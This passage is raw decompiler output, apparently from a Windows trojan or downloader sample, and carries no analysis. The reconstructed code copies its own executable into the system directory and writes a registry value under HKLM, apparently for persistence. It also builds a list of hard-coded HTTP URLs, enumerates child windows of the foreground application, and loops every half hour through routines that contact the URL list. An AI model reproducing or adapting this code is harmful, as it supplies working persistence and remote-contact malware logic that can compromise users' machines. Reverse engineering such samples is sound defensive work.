        CString::CString((CString *)v14, (const struct CString *)(dword_403784 + 2 * v7));
        v16 = 3;
        v3 = sub_40141C((unsigned __int8 *)v1, (CString *)v14);
        v16 = -1;
        CString::~CString((CString *)v14);
        if ( v3 )
        {
          sub_40192C();
          if ( sub_401F80() == 1 )
            break;
        }
      }
      v8 = v0 + 1;
    }
    while ( v0 + 1 < dword_403788 );
  }
  return 0;
}
// 403784: using guessed type int dword_403784;

//----- (004022C4) --------------------------------------------------------
int __usercall sub_4022C4@<eax>(unsigned __int8 *a1@<edi>)
{
  FILE *v1; // eax
  int v3; // [esp+0h] [ebp-4Ch] BYREF
  int v4; // [esp+Ch] [ebp-40h] BYREF
  char v5[4]; // [esp+10h] [ebp-3Ch] BYREF
  int v6; // [esp+14h] [ebp-38h] BYREF
  char v7[4]; // [esp+18h] [ebp-34h] BYREF
  int v8; // [esp+1Ch] [ebp-30h] BYREF
  char v9[4]; // [esp+20h] [ebp-2Ch] BYREF
  int v10; // [esp+24h] [ebp-28h] BYREF
  char v11[4]; // [esp+28h] [ebp-24h] BYREF
  int v12; // [esp+2Ch] [ebp-20h] BYREF
  char v13[4]; // [esp+30h] [ebp-1Ch] BYREF
  int v14; // [esp+34h] [ebp-18h] BYREF
  char v15[4]; // [esp+38h] [ebp-14h] BYREF
  int *v16; // [esp+3Ch] [ebp-10h]
  int v17; // [esp+48h] [ebp-4h]

  v16 = &v3;
  CStringArray::SetSize((CStringArray *)&dword_403780, 0, -1);
  v1 = fopen(FileName, Mode);
  if ( v1 )
  {
    fclose(v1);
  }
  else
  {
    sub_4017D0((int)a1, 33);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpFlusentier);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpWwwRenatek);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpWwwBerkili);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpAdolfSeege);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpThaibaaOrg);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpThaifisher);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpAlsiroyalD);
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, dword_403788, aHttpGanzheitli);
    sub_40192C();
    v17 = 0;
    CString::CString((CString *)&v4, aCndrnndlkkffhq);
    v17 = 1;
    CString::Left(&v4, v5, 10);
    v17 = 2;
    CString::operator=(&v4, v5);
    v17 = 1;
    CString::~CString((CString *)v5);
    if ( *(_DWORD *)(v4 - 8) == 435347 )
      MessageBoxA(0, Caption, Caption, 0);
    v17 = 0;
    CString::~CString((CString *)&v4);
    v17 = 4;
    CString::CString((CString *)&v6, aJrpsoij);
    v17 = 5;
    CString::Left(&v6, v7, 10);
    v17 = 6;
    CString::operator=(&v6, v7);
    v17 = 5;
    CString::~CString((CString *)v7);
    if ( *(_DWORD *)(v6 - 8) == 435347 )
      MessageBoxA(0, Text, Text, 0);
    v17 = 4;
    CString::~CString((CString *)&v6);
    v17 = 8;
    CString::CString((CString *)&v8, aEhofchl);
    v17 = 9;
    CString::Left(&v8, v9, 10);
    v17 = 10;
    CString::operator=(&v8, v9);
    v17 = 9;
    CString::~CString((CString *)v9);
    if ( *(_DWORD *)(v8 - 8) == 435347 )
      MessageBoxA(0, aGreatestValueW, aGreatestValueW, 0);
    v17 = 8;
    CString::~CString((CString *)&v8);
    v17 = 12;
    CString::CString((CString *)&v10, aSkbdffspsn);
    v17 = 13;
    CString::Left(&v10, v11, 10);
    v17 = 14;
    CString::operator=(&v10, v11);
    v17 = 13;
    CString::~CString((CString *)v11);
    if ( *(_DWORD *)(v10 - 8) == 435347 )
      MessageBoxA(0, aAdvancingOurPr, aAdvancingOurPr, 0);
    v17 = 12;
    CString::~CString((CString *)&v10);
    v17 = 16;
    CString::CString((CString *)&v12, aMhcbsroldkkoek);
    v17 = 17;
    CString::Left(&v12, v13, 10);
    v17 = 18;
    CString::operator=(&v12, v13);
    v17 = 17;
    CString::~CString((CString *)v13);
    if ( *(_DWORD *)(v12 - 8) == 435347 )
      MessageBoxA(0, aTowardTheInsti, aTowardTheInsti, 0);
    v17 = 16;
    CString::~CString((CString *)&v12);
    v17 = 20;
    CString::CString((CString *)&v14, aNrildihdelffgr);
    v17 = 21;
    CString::Left(&v14, v15, 10);
    v17 = 22;
    CString::operator=(&v14, v15);
    v17 = 21;
    CString::~CString((CString *)v15);
    if ( *(_DWORD *)(v14 - 8) == 435347 )
      MessageBoxA(0, aGoalsFurther, aGoalsFurther, 0);
    v17 = 20;
    CString::~CString((CString *)&v14);
    v17 = -1;
  }
  return sub_401A34(a1);
}
// 40311A: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 403144: using guessed type int __thiscall CString::Left(_DWORD, _DWORD, _DWORD);
// 403780: using guessed type int dword_403780;

//----- (0040275C) --------------------------------------------------------
void __noreturn sub_40275C()
{
  struct AFX_MODULE_STATE *v0; // eax
  LSTATUS v1; // eax
  int v2; // eax
  CString *v3; // [esp+0h] [ebp-4BCh] BYREF
  CHAR Buffer[260]; // [esp+4h] [ebp-4B8h] BYREF
  CHAR Filename[256]; // [esp+108h] [ebp-3B4h] BYREF
  _BYTE v6[2]; // [esp+208h] [ebp-2B4h] BYREF
  unsigned __int8 v7[2]; // [esp+20Ah] [ebp-2B2h] BYREF
  char v8[4]; // [esp+20Ch] [ebp-2B0h] BYREF
  LPCSTR lpNewFileName; // [esp+210h] [ebp-2ACh] BYREF
  HKEY v10; // [esp+214h] [ebp-2A8h]
  HKEY hKey; // [esp+218h] [ebp-2A4h]
  HKEY phkResult; // [esp+21Ch] [ebp-2A0h] BYREF
  DWORD dwDisposition; // [esp+220h] [ebp-29Ch] BYREF
  char v14[32]; // [esp+224h] [ebp-298h] BYREF
  char v15[600]; // [esp+244h] [ebp-278h] BYREF
  LPCSTR lpExistingFileName; // [esp+4A8h] [ebp-14h]
  CString **v17; // [esp+4ACh] [ebp-10h]
  int v18; // [esp+4B8h] [ebp-4h]

  v17 = &v3;
  qmemcpy(Buffer, &unk_405120, sizeof(Buffer));
  GetSystemDirectoryA(Buffer, 0x104u);
  CString::operator=(&dword_403764, Buffer);
  CString::operator+=(&dword_403764, asc_405E80);
  qmemcpy(Filename, &unk_405000, sizeof(Filename));
  qmemcpy(v6, (char *)&unk_405000 + 256, sizeof(v6));
  v0 = AfxGetModuleState();
  GetModuleFileNameA(*((HMODULE *)v0 + 2), Filename, 0x104u);
  CString::operator=(&dword_403760, Filename);
  CString::MakeLower((CString *)&dword_403760);
  operator+(v8, &dword_403764, aDriversC656Tx);
  v18 = 0;
  CString::operator=(&FileName, v8);
  v18 = -1;
  CString::~CString((CString *)v8);
  lpExistingFileName = (LPCSTR)dword_403760;
  operator+(&lpNewFileName, &dword_403764, Data);
  v18 = 1;
  CopyFileA(lpExistingFileName, lpNewFileName, 0);
  v18 = -1;
  CString::~CString((CString *)&lpNewFileName);
  sub_4022C4(v7);
  v10 = 0;
  hKey = 0;
  v18 = 3;
  phkResult = 0;
  v1 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, aSoftwareMicros_0, 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition);
  if ( !v1 )
  {
    v1 = 0;
    if ( hKey )
    {
      v1 = RegCloseKey(hKey);
      hKey = 0;
    }
    hKey = phkResult;
  }
  if ( !v1 )
  {
    v2 = lstrlenA((LPCSTR)Data);
    RegSetValueExA(hKey, aIsxa, 0, 1u, Data, v2 + 1);
  }
  v18 = 2;
  if ( hKey )
  {
    RegCloseKey(hKey);
    hKey = 0;
  }
  if ( v10 )
  {
    RegCloseKey(v10);
    v10 = 0;
  }
  v3 = (CString *)v14;
  CString::CString((CString *)v14);
  v18 = 4;
  `eh vector constructor iterator'(
    v15,
    0xCu,
    50,
    (void (__thiscall *)(void *))sub_402FBC,
    (void (__thiscall *)(void *))sub_402F58);
  v18 = 5;
  sub_402B08(v14);
  while ( 1 )
  {
    sub_402134();
    SleepEx(0x1B7740u, 1);
  }
}
// 40275C: using guessed type void __noreturn sub_40275C();
// 4030E4: using guessed type int __stdcall operator+(_DWORD, _DWORD, _DWORD);
// 40311A: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 403150: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 403156: using guessed type int __thiscall CString::operator+=(_DWORD, _DWORD);
// 403760: using guessed type int dword_403760;
// 403764: using guessed type int dword_403764;

//----- (004029F4) --------------------------------------------------------
int __thiscall sub_4029F4(int *this, char a2, char a3, int a4)
{
  int result; // eax
  int *v5; // esi
  int v6; // ebx
  int v7; // [esp+0h] [ebp-24h] BYREF
  int v8; // [esp+Ch] [ebp-18h]
  int *v9; // [esp+10h] [ebp-14h]
  int *v10; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  v10 = &v7;
  v9 = this;
  v8 = a4;
  v11 = 1;
  if ( *this <= 49 )
  {
    CString::MakeLower((CString *)&a3);
    CString::MakeLower((CString *)&a2);
    v5 = v9;
    v6 = (*v9)++;
    CString::operator=(&v5[2 * v6 + 5 + v6], &a3);
    v5[3 * *v5 + 3] = v8;
    CString::operator=(&v5[3 * *v5 + 1], &a2);
    v11 = 0;
    CString::~CString((CString *)&a3);
    v11 = -1;
    CString::~CString((CString *)&a2);
    result = 1;
  }
  else
  {
    v11 = 0;
    CString::~CString((CString *)&a3);
    v11 = -1;
    CString::~CString((CString *)&a2);
    result = 0;
  }
  return result;
}
// 40311A: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);

//----- (00402B08) --------------------------------------------------------
int __thiscall sub_402B08(void *this)
{
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 7) = -1;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 6) = 0;
  if ( !sub_402BC0() )
    return 0;
  if ( !*((_DWORD *)this + 3) )
    AfxBeginThread(sub_402D08, this, 0, 0, 0, 0);
  return 1;
}

//----- (00402B4C) --------------------------------------------------------
int __userpurge sub_402B4C@<eax>(int *a1@<ecx>, DWORD a2@<esi>, int a3)
{
  int v4; // ebp
  int v6; // edi
  HWND v7; // eax
  HWND v8; // ebx
  DWORD dwProcessId[5]; // [esp+0h] [ebp-14h] BYREF

  dwProcessId[0] = a2;
  v4 = 1;
  if ( a3 )
  {
    if ( !a1[6] )
      return 0;
    v4 = 500;
  }
  else
  {
    a1[6] = 0;
  }
  v6 = 0;
  while ( 1 )
  {
    v7 = GetForegroundWindow();
    v8 = v7;
    if ( v7 != (HWND)a1[6] )
      break;
    if ( ++v6 >= v4 )
      return 0;
  }
  GetWindowThreadProcessId(v7, dwProcessId);
  if ( dwProcessId[0] == a1[4] )
  {
    a1[6] = (int)v8;
    sub_402C00(a1);
  }
  return a1[6];
}
// 402B81: conditional instruction was optimized away because of 'ebp.4 in (==1|==1F4)'

//----- (00402BBC) --------------------------------------------------------
int sub_402BBC()
{
  return 0;
}

//----- (00402BC0) --------------------------------------------------------
int sub_402BC0()
{
  return 0;
}

//----- (00402C00) --------------------------------------------------------
HWND __thiscall sub_402C00(int *this)
{
  HWND result; // eax
  char v2; // [esp-4h] [ebp-234h] BYREF
  char v3[4]; // [esp+0h] [ebp-230h] BYREF
  CHAR String[500]; // [esp+8h] [ebp-228h] BYREF
  char v5[12]; // [esp+1FCh] [ebp-34h] BYREF
  int *v6; // [esp+214h] [ebp-1Ch]
  int *v7; // [esp+218h] [ebp-18h]
  HWND hWndChildAfter; // [esp+21Ch] [ebp-14h]
  CHAR *v9; // [esp+220h] [ebp-10h]
  int v10; // [esp+22Ch] [ebp-4h]

  v9 = String;
  this[7] = -1;
  v7 = this;
  v6 = this + 7;
  hWndChildAfter = 0;
  qmemcpy(String, &unk_405240, sizeof(String));
  while ( 1 )
  {
    result = FindWindowExA((HWND)v7[6], hWndChildAfter, 0, 0);
    hWndChildAfter = result;
    if ( !result )
      break;
    GetWindowTextA(result, String, 500);
    CString::CString((CString *)v5, String);
    v10 = 0;
    GetClassNameA(hWndChildAfter, String, 500);
    CString::CString((CString *)&v2, (const struct CString *)v5);
    CString::CString((CString *)v3, String);
    sub_4029F4(v6, v2, v3[0], (int)hWndChildAfter);
    v10 = -1;
    CString::~CString((CString *)v5);
  }
  return result;
}

//----- (00402D08) --------------------------------------------------------
unsigned int __cdecl sub_402D08(void *a1)
{
  while ( !*((_DWORD *)a1 + 5) )
  {
    Sleep(2u);
    if ( sub_402B4C((int *)a1, (DWORD)a1, 0) )
    {
      sub_402BBC();
      *((_DWORD *)a1 + 5) = 1;
      *((_DWORD *)a1 + 7) = -1;
    }
  }
  return 0;
}

//----- (00402D4C) --------------------------------------------------------
int sub_402D4C()
{
  CString::CString((CString *)&dword_403760);
  atexit(sub_402E40);
  CString::CString((CString *)&FileName);
  atexit(sub_402E34);
  CString::CString((CString *)&dword_403764);
  atexit(sub_402E28);
  CWinApp::CWinApp((CWinApp *)&dword_403680, 0);
  dword_403680 = (int)&off_405AE0;
  atexit((void (__cdecl *)())sub_402DD0);
  CStringArray::CStringArray((CStringArray *)&dword_403780);
  return atexit(sub_402DC4);
}
// 403680: using guessed type int dword_403680;
// 403760: using guessed type int dword_403760;
// 403764: using guessed type int dword_403764;
// 403780: using guessed type int dword_403780;
// 405AE0: using guessed type struct CRuntimeClass *(__thiscall *off_405AE0)(CWinApp *__hidden this);

//----- (00402DC4) --------------------------------------------------------
void __cdecl sub_402DC4()
{
  CStringArray::~CStringArray((CStringArray *)&dword_403780);
}
// 403780: using guessed type int dword_403780;

//----- (00402DD0) --------------------------------------------------------
void __usercall sub_402DD0(int a1@<edi>, int a2@<esi>)
{
  int v2[8]; // [esp+0h] [ebp-20h] BYREF

  v2[4] = (int)v2;
  v2[0] = a1;
  v2[1] = a2;
  v2[3] = (int)&dword_403680;
  v2[7] = -1;
  CWinApp::~CWinApp((CWinApp *)&dword_403680);
}
// 403680: using guessed type int dword_403680;

//----- (00402E28) --------------------------------------------------------
void __cdecl sub_402E28()
{
  CString::~CString((CString *)&dword_403764);
}
// 403764: using guessed type int dword_403764;

//----- (00402E34) --------------------------------------------------------
void __cdecl sub_402E34()
{
  CString::~CString((CString *)&FileName);
}

//----- (00402E40) --------------------------------------------------------
void __cdecl sub_402E40()
{
  CString::~CString((CString *)&dword_403760);
}
// 403760: using guessed type int dword_403760;

//----- (00402E4C) --------------------------------------------------------
int (**sub_402E4C())()
{
  return &off_405464;
}
// 405464: using guessed type int (*off_405464)();

//----- (00402E54) --------------------------------------------------------
int sub_402E54()
{
  return CWinApp::messageMap;
}

//----- (00402E5C) --------------------------------------------------------
HKEY __thiscall sub_402E5C(HKEY *this)
{
  HKEY result; // eax

  result = *this;
  if ( *this )
  {
    result = (HKEY)RegCloseKey(*this);
    *this = 0;
  }
  return result;
}

//----- (00402E78) --------------------------------------------------------
void __usercall sub_402E78(int a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[4]; // [esp+0h] [ebp-24h] BYREF
  CString *v4; // [esp+10h] [ebp-14h]
  int *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = v3;
  v3[0] = a2;
  v3[1] = a3;
  v4 = (CString *)a1;
  v3[3] = a1 + 28;
  v6 = 0;
  `eh vector destructor iterator'((void *)(a1 + 32), 0xCu, 50, (void (__thiscall *)(void *))sub_402F58);
  CString::~CString(v4);
}

//----- (00402EFC) --------------------------------------------------------
void __usercall sub_402EFC(int a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[8]; // [esp+0h] [ebp-20h] BYREF

  v3[4] = (int)v3;
  v3[0] = a2;
  v3[1] = a3;
  v3[3] = a1;
  v3[7] = -1;
  `eh vector destructor iterator'((void *)(a1 + 4), 0xCu, 50, (void (__thiscall *)(void *))sub_402F58);
}

//----- (00402F58) --------------------------------------------------------
void __usercall sub_402F58(void *a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  CString *v4; // [esp+Ch] [ebp-14h]
  int *v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = v3;
  v3[0] = a2;
  v3[1] = a3;
  v4 = (CString *)a1;
  v6 = 0;
  CString::~CString((CString *)((char *)a1 + 4));
  CString::~CString(v4);
}

//----- (00402FBC) --------------------------------------------------------
void __usercall sub_402FBC(void *a1@<ecx>, int a2@<edi>, int a3@<esi>)
{
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  CString *v4; // [esp+Ch] [ebp-14h]
  int *v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = v3;
  v3[0] = a2;
  v3[1] = a3;
  v4 = (CString *)a1;
  CString::CString((CString *)a1);
  v6 = 0;
  CString::CString((CString *)((char *)v4 + 4));
}

//----- (00403020) --------------------------------------------------------
void __userpurge sub_403020(void *a1@<ecx>, int a2@<edi>, int a3@<esi>, char a4)
{
  int v4[2]; // [esp+0h] [ebp-24h] BYREF
  void *v5; // [esp+Ch] [ebp-18h]
  CWinApp *v6; // [esp+10h] [ebp-14h]
  int *v7; // [esp+14h] [ebp-10h]
  int v8; // [esp+20h] [ebp-4h]

  v7 = v4;
  v4[0] = a2;
  v4[1] = a3;
  v5 = a1;
  v6 = (CWinApp *)a1;
  v8 = -1;
  CWinApp::~CWinApp((CWinApp *)a1);
  if ( (a4 & 1) != 0 )
    operator delete(v5);
}

//----- (004035F2) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00403642) --------------------------------------------------------
int sub_403642()
{
  int result; // eax

  result = AfxInitialize(0, 0x600u);
  byte_403678 = result;
  return result;
}
// 403678: using guessed type char byte_403678;

// nfuncs=136 queued=34 decompiled=34 lumina nreq=0 worse=0 better=0
// ALL OK, 34 function(s) have been successfully decompiled
